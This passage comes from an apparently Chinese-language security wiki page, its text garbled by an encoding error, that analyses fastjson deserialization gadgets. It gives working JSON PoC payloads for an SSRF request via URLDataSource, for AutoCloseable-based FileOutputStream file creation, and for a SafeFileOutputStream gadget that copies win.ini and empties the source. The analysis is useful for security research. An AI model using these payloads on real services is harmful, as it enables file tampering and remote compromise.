    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">getDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> dataSource<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDataSource</span><span class="token punctuation">(</span><span class="token class-name">URL</span> url<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>dataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLDataSource</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ„é€ æˆäº†ä¸€ä¸ª DataSource å¯¹è±¡</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>åœ¨æ‹¿åˆ° DatasourceException è¿™ä¸ªç±»çš„æˆå‘˜å˜é‡ä»¥åï¼Œå› æ­¤åœ¨ JSON.toJSON ä¸­å–å¾—çš„ååºåˆ—åŒ–çš„ç±» DatasourceException çš„å‡ ä¸ª gettter çš„ filed ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä» Throwable ç»§æ‰¿çš„ 4 ä¸ª getter å’Œè‡ªèº«çš„ getter å…± 5 ä¸ªã€‚</p><p>é‚£ä¹ˆæ­¤æ—¶è¦æ”¾å…¥åˆ° JSONObject ä¸­ï¼Œé‚£ä¹ˆå¯¹äºå…¶ä¸­çš„æ¯ä¸ªé”®å’Œå€¼éƒ½å°† put ä¸€æ¬¡ï¼Œé‚£ä¹ˆå¯¹äºå…¶ä¸­çš„ valueï¼Œåˆè¦è°ƒç”¨ä¸€æ¬¡ <code>tojson(value)</code>â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428164306-ldzoyxx.0c8d353e.png" alt="image" loading="lazy">â€‹</p><p>é‚£ä¹ˆå¯¹äºèµ‹å€¼ç»™ datasource çš„ URLDataSource è€Œè¨€ï¼Œä¹Ÿè¦èµ°ä¸€æ¬¡ tojsonï¼Œå› æ­¤æ­¤æ—¶è¦è°ƒç”¨ URLDataSource çš„æ‰€æœ‰ getterã€‚é‚£ä¹ˆå¯¹äº inputStreamï¼Œè¦è°ƒç”¨ URLDataSource çš„ getInputStream,é‚£ä¹ˆåœ¨ getInputStream ä¸­æ­¤æ—¶å°†è§¦å‘è¯·æ±‚ã€‚</p><p><strong>ã€POCã€‘</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.lang.Exception&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;DatasourceException&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;dataSource&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.net.URL&quot;</span><span class="token punctuation">,</span>
        <span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;http://127.0.0.1:2333/hello&quot;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428100858-pw2vcri.12855117.png" alt="image" loading="lazy">â€‹</p><h3 id="autocloseable-åˆ©ç”¨" tabindex="-1"><a class="header-anchor" href="#autocloseable-åˆ©ç”¨"><span>AutoCloseable åˆ©ç”¨</span></a></h3><h4 id="åŸç†-1" tabindex="-1"><a class="header-anchor" href="#åŸç†-1"><span>åŸç†</span></a></h4><p>ä¸ <code>Throwable</code>â€‹ ç±»ä¼¼åœ°ï¼Œè¿˜æœ‰ <code>AutoCloseable</code>â€‹ã€‚</p><p>æ¥ç€æ¥çœ‹ <code>JavaBeanDeserializer#deserialze()</code>â€‹ï¼ŒåŒºåˆ«åœ¨äº <code>JavaBeanDeserializer#deserialze()</code>â€‹ ä¸­çš„ expectClass å‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œæ‰€ä»¥æ¼æ´åˆ©ç”¨å¯å‘æŒ¥çš„ç©ºé—´æ›´å¤§ã€‚</p><p>ç°åœ¨å…¬å¼€çš„æ¯”è¾ƒå…·æœ‰å®æˆ˜æ„ä¹‰çš„ gadget éƒ½ä½¿ç”¨äº† <code>java.lang.AutoCloseable</code>â€‹ ä½œä¸º expectClassã€‚ä¹‹æ‰€ä»¥ä½¿ç”¨ AutoCloseable è€Œä¸æ˜¯å…¶å®ƒç±»ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p><ul><li>java.lang.AutoCloseable åœ¨ <code>TypeUtils#mappings</code>â€‹ ç¼“å­˜é›†åˆä¸­</li><li>java.lang.AutoCloseable ä½¿ç”¨ fastjson é»˜è®¤çš„ååºåˆ—åŒ–å™¨ JavaBeanDeserializer</li><li>é€šè¿‡æŸ¥é˜… JDK æ–‡æ¡£å¯çŸ¥ï¼Œ<a href="https://docs.oracle.com/javase/8/docs/api/java/lang/AutoCloseable.html" target="_blank" rel="noopener noreferrer">AutoCloseable<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ï¼ˆå³å…¶å­ç±»å¯¹è±¡ï¼‰æŒæœ‰æ–‡ä»¶å¥æŸ„æˆ–è€… socket å¥æŸ„ï¼Œæ‰€ä»¥å®ƒæ˜¯å¾ˆå¤šç±»å‹çš„çˆ¶æ¥å£(æ¯”å¦‚ xxxStreamã€xxxChannelã€xxxConnection)ã€‚å› æ­¤å³ä¾¿æ— æ³•æ‰¾åˆ° RCE gadgetï¼Œä¹Ÿå¯ä»¥æ‰¾åˆ°å®ç°æ–‡ä»¶è¯»å–æˆ–å†™å…¥çš„ gadgetï¼Œä»è€Œå¯ä»¥æ ¹æ®ç›®æ ‡ç¯å¢ƒå®é™…æƒ…å†µä¸²å‡º RCE</li></ul><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428102334-8c9qjov.5a0876b3.png" alt="image" title="com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425153909-tbmbcsb.9989bbdf.png" alt="image" loading="lazy">â€‹</p><p>çˆ¶ç±»ã€çˆ¶æ¥å£é»‘åå•ï¼Œfastjson åœ¨åˆ¤æ–­æœŸæœ›ç±»ä¹‹å‰å°†ç»§æ‰¿è‡ª ClassLoaderã€DataSourceã€RowSet çš„ç±»ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428102817-zot51h3.a00de011.png" alt="image" loading="lazy">â€‹</p><h4 id="æ„é€ -poc-æ—¶çš„å‘-1-é€‰å¯¹æ„é€ æ–¹æ³•" tabindex="-1"><a class="header-anchor" href="#æ„é€ -poc-æ—¶çš„å‘-1-é€‰å¯¹æ„é€ æ–¹æ³•"><span>æ„é€  PoC æ—¶çš„å‘ - 1ï¼šé€‰å¯¹æ„é€ æ–¹æ³•</span></a></h4><p>fastjson åœ¨è°ƒç”¨ <code>JavaBeanDeserializer#deserialze()</code>â€‹ è¿›è¡Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œä¼šå»å¯»æ‰¾ç›®æ ‡ç±»çš„ <code>public</code>â€‹ ç±»å‹çš„æ„é€ æ–¹æ³•ï¼š<mark>å¦‚æœå­˜åœ¨æ— å‚æ„é€ æ–¹æ³•</mark>ï¼Œåˆ™å°†å…¶ä½œä¸ºæ„é€ æ–¹æ³•ä¾›åç»­å®ä¾‹åŒ–ä½¿ç”¨ã€‚å¦åˆ™ï¼Œä½¿ç”¨<mark>å‚æ•°æ•°é‡æœ€å¤šä¸”æ’åœ¨æœ€å‰é¢çš„æ„é€ æ–¹æ³•</mark>ã€‚è¿™é‡Œçš„æœ€å‰é¢æ˜¯æŒ‡ <code>ASMUtils.lookupParameterNames(constructor)</code>â€‹ è·å–åˆ°çš„é¡ºåºã€‚</p><p>â€‹<code>com.alibaba.fastjson.util.ASMUtils#lookupParameterNames</code>â€‹</p><p>(å…·ä½“ä»£ç é€»è¾‘è§ <code>JavaBeanInfo#build()</code>â€‹ é™æ€æ–¹æ³•)</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425160805-92qotq9.6285dce8.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425161909-rzh0jg8.ef039987.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425163224-04xkxqc.1d3fbbf5.png" alt="image" loading="lazy">â€‹</p><p>ä»ä¸Šé¢çš„ä¸‰ä¸ªåˆ¤æ–­å¯çŸ¥ï¼Œfastjson åªä¿ç•™ç¬¦åˆç‰¹å®šæ¡ä»¶çš„æ„é€ å‡½æ•°ã€‚</p><p><strong><mark>ä¿ç•™æ‰€æœ‰ publicä¿®é¥°çš„æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”æœ‰å‚æ•°åçš„æ„é€ å‡½æ•°ä¼šè¢«ä¼˜å…ˆé€‰æ‹©ï¼Œå¦‚æœå­˜åœ¨å‚æ•°æ•°é‡ç›¸åŒçš„æ„é€ å‡½æ•°ï¼Œåˆ™åªä¿ç•™ç¬¬ä¸€ä¸ªã€‚</mark></strong> â€‹</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘æƒ³é€šè¿‡ fastjson ååºåˆ—åŒ– <code>java.io.FileOutputStream</code>â€‹ æ¥æ–°å»ºä¸€ä¸ªæ–‡ä»¶ã€‚FileOutpuStream çš„æ„é€ æ–¹æ³•æœ‰å¤šä¸ªï¼Œå¦‚ä¸‹å›¾ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425172326-znmp4u2.283fc290.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425173927-dzw3yre.d05edc73.png" alt="image" loading="lazy">â€‹</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.io.FileOutputStream&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;name&quot;</span><span class="token operator">:</span> <span class="token string">&quot;D:/tmp/test2.txt&quot;</span>
<span class="token punctuation">}</span>
<span class="token comment">// è¿™é‡Œä¸»è¦æ˜¯å±æ€§é”™äº†å¯¼è‡´çš„æ„é€ å‡½æ•°ï¼Œæ˜¯ file è€Œä¸æ˜¯ nameï¼Œä¸»è¦æ˜¯ä¸ºäº†çœ‹è°ƒç”¨çš„å“ªä¸ªæ„é€ å‡½æ•°</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425174349-b1ah3py.d978158b.png" alt="image" loading="lazy">â€‹</p><p>ç»“æœæŠ›å¼‚å¸¸ï¼Œæ— æ³•åˆ›å»ºå®ä¾‹ã€‚ä»æŠ¥é”™ä¿¡æ¯å¯ä»¥çœ‹åˆ°å®ƒè°ƒç”¨çš„æ˜¯ <code>public FileOutputStream(File, boolean)</code>â€‹ è¿™ä¸ªæ„é€ æ–¹æ³•ã€‚</p><p>æ•…å°† JSON å­—ç¬¦ä¸²æ”¹ä¸ºï¼š</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.io.FileOutputStream&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;file&quot;</span><span class="token operator">:</span> <span class="token string">&quot;D:/tmp/test1.txt&quot;</span>
<span class="token punctuation">}</span>

<span class="token comment">// æˆ–è€…æ˜¾å¼å£°æ˜ append</span>
<span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.io.FileOutputStream&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;file&quot;</span><span class="token operator">:</span> <span class="token string">&quot;D:/tmp/test2.txt&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;append&quot;</span><span class="token operator">:</span> <span class="token string">&quot;false&quot;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425171345-5jjiu6x.b83f6a69.png" alt="image" loading="lazy">â€‹</p><p>è¿è¡Œåï¼ŒæˆåŠŸååºåˆ—åŒ–ï¼Œå¯ä»¥çœ‹åˆ°ç”Ÿæˆäº†æ–‡ä»¶ã€‚<strong><mark>å‰ææ˜¯ä½¿ç”¨ JDK 11</mark></strong>ï¼ŒJDK 8 ä¸ç®¡å¦‚ä½•éƒ½ä¼šæŠ¥é”™ï¼š<code>default constructor not found</code>â€‹ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425172734-87ixm5d.751723ab.png" alt="image" loading="lazy">â€‹</p><h4 id="æ„é€ -poc-æ—¶çš„å‘-2-æ„é€ æ–¹æ³•éœ€å¸¦è°ƒè¯•ä¿¡æ¯" tabindex="-1"><a class="header-anchor" href="#æ„é€ -poc-æ—¶çš„å‘-2-æ„é€ æ–¹æ³•éœ€å¸¦è°ƒè¯•ä¿¡æ¯"><span>æ„é€  PoC æ—¶çš„å‘ - 2ï¼šæ„é€ æ–¹æ³•éœ€å¸¦è°ƒè¯•ä¿¡æ¯</span></a></h4><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425174038-ojkna0i.687c6c1d.png" alt="image" loading="lazy">â€‹</p><p>è¿è¡Œä¸Šé¢çš„ PoC ä¼šæŠ¥é”™ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425154708-rvpbc7y.306dd164.png" alt="image" loading="lazy">â€‹</p><p>è°ƒè¯•åˆ†æå‘ç° <code>ASMUtils.lookupParameterNames(constructor)</code>â€‹ æ–¹æ³•è·å–æ„é€ æ–¹æ³•çš„å‚æ•°åå¤±è´¥ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425174845-7lo5yui.a0283dae.png" alt="image" loading="lazy">â€‹</p><p><strong><mark>è°ƒè¯•ç¯å¢ƒçš„ Oracle JDK 8u20ï¼Œå¹¶æ²¡æœ‰ä¿ç•™åŒ…å«æœ‰å‚æ•°åçš„è°ƒè¯•ä¿¡æ¯ã€‚</mark></strong></p><p>å¯ä»¥ä½¿ç”¨ <code>javap -l \&lt;class-name\&gt;</code>â€‹ æŸ¥çœ‹æŒ‡å®šç±»æ˜¯å¦åŒ…å«å‚æ•°åä¿¡æ¯ã€‚ ä¸‹é¢æ¥å¯¹æ¯”ä¸€ä¸‹ç¬”è€…å®‰è£…çš„ Oracle JDK <code>8u201</code> â€‹å’Œ OpenJDK <code>11.0.14</code> â€‹çš„ <code>java.io.FileOutputStream</code> â€‹ç±»ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425180248-ynkdxka.06fa1c52.png" alt="image" loading="lazy">â€‹</p><p>å¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹åˆ° OpenJDK 11.0.14 ä¸­ï¼Œæ˜¯ä¿ç•™äº†å±€éƒ¨å˜é‡è¡¨ <code>LocalVariableTable</code>â€‹ çš„ï¼Œå³ä¿ç•™äº†**<mark>å±€éƒ¨å˜é‡åä¿¡æ¯</mark>**ã€‚</p><p>è€Œå…·ä½“å“ªä¸ªç‰ˆæœ¬ JDK å­˜åœ¨è°ƒè¯•ä¿¡æ¯ï¼Œæˆ–ä¸å­˜åœ¨è°ƒè¯•ä¿¡æ¯ï¼Œè¿™ä¸ªå¹¶æ²¡æœ‰è§„å¾‹ã€‚ï¼ˆopenjdk 8, åŒ…æ‹¬ oracle jdk éƒ½æ˜¯ä¸å¸¦è¿™äº›ä¿¡æ¯çš„ï¼‰å› æ­¤ï¼Œ<strong>å°½ç®¡å­˜åœ¨ä»…ä¾èµ– JDK çš„ Gadgetï¼Œä½†é€šç”¨æ€§æ˜¯å¤§æ‰“æŠ˜æ‰£çš„ã€‚ä¸è¿‡å¥½åœ¨å¤šæ•°çš„ç¬¬ä¸‰æ–¹åº“é‡Œçš„å­—èŠ‚ç æ˜¯æœ‰</strong> <strong>â€‹</strong>â€‹<strong>â€‹<code>LocalVariableTable</code>â€‹</strong>â€‹<strong>â€‹</strong>â€‹ <strong>çš„</strong>ã€‚</p><h2 id="åˆ©ç”¨é“¾" tabindex="-1"><a class="header-anchor" href="#åˆ©ç”¨é“¾"><span>åˆ©ç”¨é“¾</span></a></h2><h3 id="gadget-1-å¤åˆ¶æ–‡ä»¶" tabindex="-1"><a class="header-anchor" href="#gadget-1-å¤åˆ¶æ–‡ä»¶"><span>Gadget 1ï¼šå¤åˆ¶æ–‡ä»¶</span></a></h3><p><strong><mark>ã€æ³¨æ„äº‹é¡¹ã€‘</mark></strong></p><p>è¯·åŠ¡å¿…ç¡®è®¤ src æ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¸ç„¶ä¼šè¢«æ¸…ç©ºã€‚ã€‚ã€‚</p><p>é™¤éè¯¥æ–‡ä»¶è¢«é™åˆ¶è®¿é—®ï¼Œå¦‚ <code>C:/Windows/win.ini</code>â€‹</p><p><strong><mark>æ‰€ä»¥åº”è¯¥å«å¤åˆ¶å¹¶æ¸…ç©ºæ–‡ä»¶æ‰å¯¹ã€‚ã€‚ã€‚</mark></strong></p><p><strong>ã€ä¾èµ–ã€‘</strong></p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.aspectj<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>aspectjtools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.9.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ã€<strong>PoCã€‘</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;targetPath&quot;</span><span class="token operator">:</span> <span class="token string">&quot;D:/tmp/winini.txt&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;tempPath&quot;</span><span class="token operator">:</span> <span class="token string">&quot;C:/Windows/win.ini&quot;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240426094151-h7q2cpe.3dc1145e.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240430111850-lvmiqx3.aa485c98.png" alt="image" loading="lazy">â€‹</p><p>â€‹<code>org.eclipse.core.internal.localstore.SafeFileOutputStream#SafeFileOutputStream</code>â€‹</p><p>å› ä¸º <code>SafeFileOutputStream</code>â€‹ çš„æ„é€ æ–¹æ³•é‡Œï¼Œå½“ targetPath ä¸å­˜åœ¨ä¸” tempPath å­˜åœ¨æ—¶ï¼Œä¾¿ä¼šè¿›è¡Œæ–‡ä»¶å¤åˆ¶ã€‚<strong><mark>æ¼äº†ä¸€ä¸ªï¼Œè¿˜ä¼šæ¸…ç©ºæºæ–‡ä»¶ã€‚ã€‚ã€‚</mark></strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token class-name">SafeFileOutputStream</span><span class="token punctuation">(</span><span class="token class-name">String</span> targetPath<span class="token punctuation">,</span> <span class="token class-name">String</span> tempPath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>failed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>target <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>targetPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createTempFile</span><span class="token punctuation">(</span>tempPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// å¦‚æœç›®æ ‡æ–‡ä»¶ dst ä¸å­˜åœ¨</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>temp<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
                <span class="token comment">// dstã€src éƒ½ä¸å­˜åœ¨æ—¶ä¼šå¾€ dst å†™æ•°æ®</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">// dst ä¸å­˜åœ¨ã€src å­˜åœ¨æ—¶ï¼Œå…ˆ &quot;mv src dst&quot;ï¼Œå†å¾€ src å†™æ•°æ®</span>
            <span class="token comment">// å°†ä¸´æ—¶æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶ä¸­</span>
            <span class="token comment">// å› ä¸ºæ²¡æœ‰ return ä¼šç»§ç»­æ‰§è¡Œä¸‹é¢çš„è¯­å¥ï¼Œå¯¼è‡´ src æ¸…ç©º</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>temp<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// å¦‚æœ dst æ–‡ä»¶å­˜åœ¨ï¼ŒPoC å°±ä¼šå¾€ src å†™æ•°æ®</span>
        <span class="token comment">// èµ°åˆ°è¿™é‡Œ src ä¼šè¢«æ”¹å˜è¿™ç‚¹è¦æ³¨æ„</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240430111517-4tvnps3.4edae8dc.png" alt="image" loading="lazy">â€‹</p><h3 id="gadget-2-å†™æ–‡ä»¶" tabindex="-1"><a class="header-anchor" href="#gadget-2-å†™æ–‡ä»¶"><span>Gadget 2ï¼šå†™æ–‡ä»¶</span></a></h3><p><a href="https://b1ue.cn/archives/382.html" target="_blank" rel="noopener noreferrer">@ æµ…è“<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>åœ¨æ–‡ç« ä¸­åˆ†äº«äº†ä»–æŒ–æ˜å†™æ–‡ä»¶ gadget çš„æ€è·¯ï¼š</p><ul><li><p>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•<mark>æŒ‡å®šæ–‡ä»¶è·¯å¾„çš„ OutputStream</mark></p></li><li><p>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•<mark>ä¼ å…¥å­—èŠ‚æ•°æ®çš„ OutputStreamï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª OutputStreamï¼Œæœ€åå¯ä»¥é€šè¿‡ write æ–¹æ³•å°†ä¼ å…¥çš„å­—èŠ‚ç  write åˆ°ä¼ å…¥çš„ OutputStream</mark></p></li><li><p>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•<strong>ä¼ å…¥ä¸€ä¸ª OutputStream</strong>ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è°ƒç”¨ toStringã€hashCodeã€getã€setã€æ„é€ æ–¹æ³•è°ƒç”¨ä¼ å…¥çš„ OutputStream çš„ <code>flush</code>â€‹ æ–¹æ³•</p><p><strong>ã€ä¾èµ–ã€‘</strong></p></li></ul><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token 